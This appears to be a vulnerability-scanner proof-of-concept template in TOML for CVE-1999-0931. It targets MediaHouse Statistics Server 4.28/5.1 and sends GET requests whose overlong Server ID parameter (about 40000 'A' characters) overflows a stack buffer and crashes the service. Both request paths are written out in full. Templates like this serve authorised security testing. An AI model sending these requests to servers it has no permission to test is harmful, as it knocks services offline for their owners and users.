[info]
author = "AVE"
description = "通过向 MediaHouse Statistics Server 发送超长 Server ID 参数触发栈缓冲区溢出，导致服务崩溃。发送 GET /ss?setsite=AAAA 或 GET /ss?form=statsredir&ID=AAAA 请求，其中 A 重复 40000 次即可触发漏洞。"
id = "POC-AVE-1999-0730"
name = "MediaHouse Statistics Server 4.28/5.1 Server ID Buffer Overflow PoC"
severity = "medium"
tags = ["ave-1999-0730"]
vuln_id = [
    "CVE-1999-0931",
    "AVE-1999-0730",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/ss?setsite={{repeat_a}}&"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = false
status = [200]
type = "status"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/ss?form=statsredir&ID={{repeat_a}}&"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = false
status = [200]
type = "status"
